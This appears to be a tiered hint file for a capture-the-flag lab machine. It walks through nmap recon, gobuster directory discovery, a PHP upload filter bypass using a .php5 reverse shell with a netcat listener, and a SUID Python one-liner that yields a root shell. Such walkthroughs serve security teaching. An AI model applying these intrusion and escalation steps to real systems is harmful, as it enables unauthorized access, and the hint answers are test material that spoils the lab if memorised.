author: Omar Tamer
description: PHP file upload filter bypass, SUID Python for root
key_facts: file upload only allows certain extensions

recon.nudge: Start with an nmap scan — what is running on this machine?
recon.clue: Port 80 is a web server. Open it in the browser and look at what is there.
recon.near_solve: nmap -sV -sC <target> — you will find SSH and a web server. The web server is where you start.

enumeration.nudge: The web server has more pages than what you can see — have you discovered hidden directories?
enumeration.clue: Use gobuster to find hidden directories. Look for something that lets you upload files.
enumeration.near_solve: gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt — you will find /panel/ which is a file upload form.

foothold.nudge: You found an upload form — what would you upload to get a shell?
foothold.clue: A PHP reverse shell would work, but the upload filters certain extensions. Think about alternative PHP extensions.
foothold.near_solve: Upload a PHP reverse shell but rename it to shell.php5 to bypass the .php filter. Set up a netcat listener first: nc -lvnp 4444 — then upload and visit the file at /uploads/shell.php5

privesc.nudge: You have a shell as www-data — look for binaries with special permissions.
privesc.clue: SUID binaries run as the file owner regardless of who runs them. Search for them.
privesc.near_solve: find / -perm -4000 2>/dev/null — python has the SUID bit set. Run: python -c "import os;os.execl('/bin/sh','sh','-p')" to get a root shell.

flag.nudge: You should have root — where are the flags on this machine?
flag.near_solve: cat /root/root.txt for root flag. The user flag is at /var/www/user.txt
